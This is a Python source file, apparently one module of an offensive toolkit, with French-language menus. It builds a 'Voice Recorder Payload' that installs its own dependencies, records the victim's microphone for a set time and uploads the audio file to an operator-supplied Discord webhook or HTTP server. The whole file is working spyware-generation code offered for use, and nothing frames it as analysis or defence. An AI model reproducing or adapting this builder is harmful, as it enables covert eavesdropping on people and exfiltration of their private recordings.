import os
from colorama import Fore, Style
def clear():
    os.system("cls")

def affichage():
    clear()
    print("=== Configuration Voice Recorder Payload ===\n\n")
    print(f"""
          
          {Fore.YELLOW}Options : 
{Fore.WHITE}
    1. Durée de l'enregistrement (en secondes)
          
    {Fore.YELLOW}Sortie et envoi:
          
    2. Envoi par Discord
    3. Envoi par serveur HTTP
          
{Fore.GREEN}
Tapez : set <num> pour configurer
Tapez : show pour afficher la config
Tapez : create pour générer
Tapez : exit pour quitter
            {Style.RESET_ALL}

          """)
    
def voicerec():
    clear()
    affichage()
    choix = {
        "Durée de l'enregistrement": 10,
        "Envoi par Discord": None,
        "Envoi par serveur HTTP": None,
    }

    def duree_option():
        clear()
        duree = input("Entrez la durée de l'enregistrement (en secondes) : ")
        choix["Durée de l'enregistrement"] = duree
        affichage()

    def discord_option():
        clear()
        discord = input("Entrez le webhook Discord pour l'envoi (laisser vide pour ne pas envoyer) : ")
        if discord:
            choix["Envoi par Discord"] = discord
        else:
            choix["Envoi par Discord"] = None
        affichage()

    def http_option():
        clear()
        http = input("Entrez l'URL du serveur HTTP pour l'envoi (laisser vide pour ne pas envoyer) : ")
        if http:
            choix["Envoi par serveur HTTP"] = http
        else:
            choix["Envoi par serveur HTTP"] = None
        affichage()

    def create_payload():
        clear()
        print("=== Payload Voice Recorder Généré ===\n")
        duree = choix["Durée de l'enregistrement"]
        discord_webhook = choix["Envoi par Discord"]
        http_server = choix["Envoi par serveur HTTP"]
        
        payload = f"""

import os
os.system("pip install sounddevice wavio requests")

import sounddevice as sd
import wavio
import time

def record_voice():
    duration = {duree}  # Durée en secondes
    fs = 44100  # Fréquence d'échantillonnage
    print("Enregistrement en cours...")
    recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
    sd.wait()  # Attendre la fin de l'enregistrement
    filename = "voice_recording.wav"
    wavio.write(filename, recording, fs, sampwidth=2)
    print(f"Enregistrement terminé. Fichier sauvegardé sous {{filename}}")
    return filename
def send_to_discord(webhook_url, file_path):
    import requests
    with open(file_path, 'rb') as f:
        files = {{'file': f}}
        response = requests.post(webhook_url, files=files)
    if response.status_code == 204:
        print("Fichier envoyé avec succès sur Discord.")
    else:
        print("Échec de l'envoi sur Discord.")
def send_to_http(server_url, file_path):
    import requests
    with open(file_path, 'rb') as f:
        files = {{'file': f}}
        response = requests.post(server_url, files=files)
    if response.status_code == 200:
        print("Fichier envoyé avec succès au serveur HTTP.")
    else:
        print("Échec de l'envoi au serveur HTTP.")

if __name__ == "__main__":
    recorded_file = record_voice()
"""
        if discord_webhook:
            payload += f"""
    send_to_discord(r"{discord_webhook}", recorded_file)
"""
        if http_server:
            payload += f"""
    send_to_http(r"{http_server}", recorded_file)
"""
        payload_path = os.path.join("Option", "modules", "payload", "payload_created", "voicerec_payload.py")
        os.makedirs(os.path.dirname(os.path.abspath(payload_path)), exist_ok=True)
        with open(payload_path, "w", encoding="utf-8") as f:
            f.write(payload)

    while True:
        affichage()
        cmd = input(">> ")
        if cmd.lower() == "exit":
            break
        elif cmd.lower().startswith("set "):
            try:
                option_num = int(cmd.split()[1])
                if option_num in range(1, 4):
                    option_funcs = {
                        1: duree_option,
                        2: discord_option,
                        3: http_option,
                    }
                    option_funcs[option_num]()
                else:
                    print("Numéro d'option invalide.")
            except (IndexError, ValueError):
                print("Commande invalide. Utilisez : set <num>")
        elif cmd.lower() == "show":
            clear()
            print("\nConfiguration actuelle du module Voice Recorder :")
            for key, value in choix.items():
                print(f"{key}: {value}")
            input("\nAppuyez sur Entrée pour continuer...")
        elif cmd.lower() == "create":
            create_payload()
            input("\nAppuyez sur Entrée pour continuer...")
        else:
            print("Commande invalide.")
